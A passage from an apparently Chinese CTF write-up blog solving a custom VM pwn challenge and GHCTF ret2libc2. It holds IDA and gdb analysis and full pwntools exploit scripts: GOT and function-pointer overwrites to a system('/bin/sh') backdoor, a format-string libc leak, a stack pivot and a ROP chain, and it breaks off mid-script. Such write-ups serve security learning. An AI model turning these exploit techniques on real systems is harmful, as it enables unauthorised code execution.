class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Code</span>(<span class=\"params\">op,dest,src1,src2</span>):</span><br><span class=\"line\">    code=(op&lt;&lt;<span class=\"number\">24</span>)+(dest&lt;&lt;<span class=\"number\">16</span>)+(src1&lt;&lt;<span class=\"number\">8</span>)+src2</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(code))</span><br></pre></td></tr></table></figure>\n<p>通过样的处理，我们可以控制每个字节，便于准确的控制<br>3.需要找到要覆盖的目标地址，dest_addr. 这一题中可以覆盖func的内容为backdoor.另外，常见的手法可以覆盖got表内容为backdoor .此题中我采用了后者的方法<br>4.计算对应dest_addr的偏移，这里从汇编中可以看出来，此题中的memory和reg均是以<code>rax*4</code> 来寻址。可知，均是4字节数组.所以对应偏移需要除以4，才能被数组寻到<br>5.得到偏移之后，利用0x90控制数据，注意到，数据会被改写为src1.因此，在调用前需要将某个reg内写入我们的backdoor<br>6.最后，因为我们不能直接往reg里写入任意数据，有字节和大小的限制。所以我们需要通过题目提供的运算操作，一步一步修改内容.</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"修改puts-got\"><a href=\"#修改puts-got\" class=\"headerlink\" title=\"修改puts_got\"></a>修改puts_got</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node1.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28844</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Code</span>(<span class=\"params\">op,dest,src1,src2</span>):</span><br><span class=\"line\">    code=(op&lt;&lt;<span class=\"number\">24</span>)+(dest&lt;&lt;<span class=\"number\">16</span>)+(src1&lt;&lt;<span class=\"number\">8</span>)+src2</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(code))</span><br><span class=\"line\"></span><br><span class=\"line\">backdoor=<span class=\"number\">0x400877</span> <span class=\"comment\"># system(&quot;/bin/sh\\x00&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your IP:&quot;</span>,<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your SP:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;execve:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">27</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got=<span class=\"number\">0x602018</span></span><br><span class=\"line\">offset=<span class=\"number\">0x6020e0</span>-<span class=\"number\">0x602018</span></span><br><span class=\"line\">reg=<span class=\"number\">0x6420E0</span></span><br><span class=\"line\">memory=<span class=\"number\">0x6020E0</span></span><br><span class=\"line\"><span class=\"comment\">###</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">###</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### Code </span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0x8</span>)  <span class=\"comment\"># reg[0]=0x8</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0x4</span>)  <span class=\"comment\"># reg[1]=0x4</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[2]=0xc</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[3]=reg[1]&lt;&lt;reg[1]  : reg[3]=0xc0</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"number\">0x6</span>)  <span class=\"comment\"># reg[4]=0x6</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[4]=0xe</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>)    <span class=\"comment\"># reg[1]=reg[1]+reg[3]   : reg[3]=0xce      </span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>,<span class=\"number\">0x7</span>)  <span class=\"comment\"># reg[5]=0x7</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=0xf</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">6</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[6]=reg[5]&lt;&lt;reg[1]  : reg[6]=0xf0</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">6</span>,<span class=\"number\">6</span>,<span class=\"number\">5</span>)    <span class=\"comment\"># reg[6]=reg[5]+reg[6]   : reg[6]=0xff </span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=reg[6]&lt;&lt;reg[0]  : reg[5]=0xff00</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>)    <span class=\"comment\"># reg[5]=reg[5]+reg[6]   : reg[5]=0xffff</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=reg[5]&lt;&lt;reg[0]  : reg[5]=0xffff00</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>)    <span class=\"comment\"># reg[5]=reg[5]+reg[6]   : reg[5]=0xffffff</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[5]=reg[5]&lt;&lt;reg[0]  : reg[5]=0xffffff00</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>,<span class=\"number\">3</span>)    <span class=\"comment\"># reg[5]=reg[5]+reg[3]   : reg[5]=0xffffffce</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#0x400877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"number\">0x7</span>)  <span class=\"comment\"># reg[4]=0x7</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">6</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[6]=reg[4]&lt;&lt;reg[1]  : reg[6]=0x70</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">6</span>,<span class=\"number\">6</span>,<span class=\"number\">4</span>)    <span class=\"comment\"># reg[6]=reg[6]+reg[4]   : reg[6]=0x770000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>)    <span class=\"comment\"># reg[1]=reg[1]&lt;&lt;reg[1]  : reg[1]=0x40</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[1]=reg[1]&lt;&lt;reg[0]  : reg[1]=0x4000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[1]=reg[1]&lt;&lt;reg[0]  : reg[1]=0x400000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[0]=reg[0]&lt;&lt;reg[0]  : reg[0]=0x800</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">6</span>)    <span class=\"comment\"># reg[0]=reg[0]+reg[6]   : reg[0]=0x877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># reg[1]=reg[1]+reg[0]   : reg[1]=0x4000877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x90</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)    <span class=\"comment\"># mem[reg[5]]=reg[1]     : mem[-50]=0x4000877</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"覆盖func\"><a href=\"#覆盖func\" class=\"headerlink\" title=\"覆盖func\"></a>覆盖func</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">0</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node1.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28844</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./my_vm&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Code</span>(<span class=\"params\">op,dest,src1,src2</span>):</span><br><span class=\"line\">    code=(op&lt;&lt;<span class=\"number\">24</span>)+(dest&lt;&lt;<span class=\"number\">16</span>)+(src1&lt;&lt;<span class=\"number\">8</span>)+src2</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(code))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your IP:&quot;</span>,<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;set your SP:&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;execve:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">14</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### Code </span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">8</span>)   <span class=\"comment\">#reg[0]=8</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">Code(<span class=\"number\">0x50</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[1]=-8</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>,<span class=\"number\">7</span>)   <span class=\"comment\">#reg[2]=7</span></span><br><span class=\"line\">Code(<span class=\"number\">0x10</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>,<span class=\"number\">4</span>)   <span class=\"comment\">#reg[4]=4</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"number\">4</span>)   <span class=\"comment\">#reg[3]=0x70</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">2</span>)   <span class=\"comment\">#reg[3]=0x77</span></span><br><span class=\"line\"><span class=\"comment\">### backdoor  </span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>)   <span class=\"comment\">#reg[4]=0x40</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[4]=0x4000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[4]=0x400000</span></span><br><span class=\"line\">Code(<span class=\"number\">0x80</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[0]=0x800</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">3</span>)   <span class=\"comment\">#reg[0]=0x877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x40</span>,<span class=\"number\">4</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)   <span class=\"comment\">#reg[4]=0x400877</span></span><br><span class=\"line\">Code(<span class=\"number\">0x90</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"GHCTF-ret2libc2\"><a href=\"#GHCTF-ret2libc2\" class=\"headerlink\" title=\"GHCTF ret2libc2\"></a>GHCTF ret2libc2</h1><h2 id=\"ida分析-1\"><a href=\"#ida分析-1\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"func函数分析\"><a href=\"#func函数分析\" class=\"headerlink\" title=\"func函数分析\"></a>func函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/98a456adebe8adb789ba9ca00f26a510.png\" alt=\"98a456adebe8adb789ba9ca00f26a510\"><br>1.程序很简单,main函数里只有init和func，这里直接看到func函数<br>2.可以看到存在一个格式化字符串漏洞和溢出漏洞.<br>3.程序没有提供system和<code>/bin/sh\\x00</code>，需要泄露libc，完成ret2libc.</p>\n<h3 id=\"func汇编分析\"><a href=\"#func汇编分析\" class=\"headerlink\" title=\"func汇编分析\"></a>func汇编分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/98a456adebe8adb789ba9ca00f26a510.png\" alt=\"98a456adebe8adb789ba9ca00f26a510\"><br>1.从汇编中可以看到更多信息.<br>2.首先是在leave ret 之前，lea rax [rbp+buf]. 实际上是将我们的输入的起始位置的内容交给了rax.而且可以注意到，无论是printf还是两个puts，都是通过rax来设置rdi。那么也就说我们的输入，可以给printf传递参数，也就是可以实现我们的格式化字符串漏洞.<br>3.同时，leave ret 留下了栈迁移的隐患。</p>\n<h3 id=\"gdb调试分析\"><a href=\"#gdb调试分析\" class=\"headerlink\" title=\"gdb调试分析\"></a>gdb调试分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/65dadea8bb2e5a40f2a81d8411fea262_720.png\" alt=\"65dadea8bb2e5a40f2a81d8411fea262.png\"><br>1.通过gdb动调寻找栈上可以泄露出libc的函数.将func的返回地址覆盖为0x401227，直接将printf的rdi修改成我们的输入，查看这一帧栈帧，在0x15的位置看到了__libc_start_main,计算偏移为21+6&#x3D;27.<br>2.同时，在第一次溢出时，需要覆盖rbp为有效地址。否则，这次func执行最后，会崩溃掉。</p>\n<h2 id=\"构造思路-1\"><a href=\"#构造思路-1\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先确定泄露libc的手段，格式化字符串.并且第一次溢出时需要栈迁移.在这里补充一点，除了使用格式化字符串以外，还有一种泄露的手法.观察func函数，0x401223处，会将rbp-0x10 的内容作为参数赋给rax，再下方又被赋给了rdi.那么如果[rbp-0x10]是某个got表，那就可以把got表的内容打印出来。所以我们只需要把某个got-0x10交给rbp，就可以完成第一次的栈迁移和libc的泄露。<br>2.因为程序本身是没有提供pop_rdi,但是题目给了libc.so.6文件，在泄露libc基址之后，利用libc.so.6中的pop rdi;ret，一样可以控制rdi寄存器。现在我们已经有了ret2libc的全部条件。只需要栈迁移的一个合适的地址，完成rop。<br>3.选择bss段的高地址完成这段rop。如果是采用第二种方法泄露libc的话，需要再栈迁移一次，而且为了保证程序的顺利执行，第二次溢出，需要注意维护got表的内容尤其是read，否则第三次溢出就会出错。</p>\n<h2 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"格式化字符串\"><a href=\"#格式化字符串\" class=\"headerlink\" title=\"格式化字符串\"></a>格式化字符串</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class=\"line\">io=process(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&quot;libc.so.6&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#io=remote(&quot;node2.anna.nssctf.cn&quot;,28626)</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\">bss=<span class=\"number\">0x404060</span></span><br><span class=\"line\">ret=<span class=\"number\">0x4011fa</span></span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\"></span><br><span class=\"line\">payload1=<span class=\"string\">b&#x27;%27$p&#x27;</span>.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">payload1=payload1.ljust(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;a&#x27;</span>)+p64(bss+<span class=\"number\">0x900</span>)+p64(<span class=\"number\">0x401227</span>)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;show your magic\\n&#x27;</span>,payload1)</span><br><span class=\"line\">start_addr=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">128</span></span><br><span class=\"line\">libc_base=start_addr-libc.symbols[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;start_addr-&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(start_addr)))</span><br><span class=\"line\">pop_rdi=libc_base+<span class=\"number\">0x2a3e5</span></span><br><span class=\"line\">system=libc_base+libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh=libc_base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\">one=libc_base+<span class=\"number\">0xebc85</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload2=<span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">0x38</span>)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;show your magic\\n&#x27;</span>,payload2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"迁移泄露\"><a href=\"#迁移泄露\" class=\"headerlink\" title=\"迁移泄露\"></a>迁移泄露</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node2.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28268</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leave_ret=0x</span></span><br><span class=\"line\">puts_got=elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_plt=elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">complete=<span class=\"number\">0x404070</span></span><br><span class=\"line\">func=<span class=\"number\">0x40121f</span></span><br><span class=\"line\">magic=<span class=\"number\">0x401252</span></span><br><span class=\"line\">bss=elf.bss()+<span class=\"number\">0x500</span>+<span class=\"number\">0x500</span></span><br><span class=\"line\">rsp_8=<span class=\"number\">0x401016</span></span><br><span class=\"line\">offset=<span class=\"number\">0x30</span>+<span class=\"number\">8</span></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;%13$s&#x27;</span>.ljust(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;\\x61&#x27;</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x404038</span>)</span><br><span class=\"line\">payload+=p64(func)</span><br><span class=\"line\">payload+=p64(puts_got)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;show your magic\\n&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">read=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span 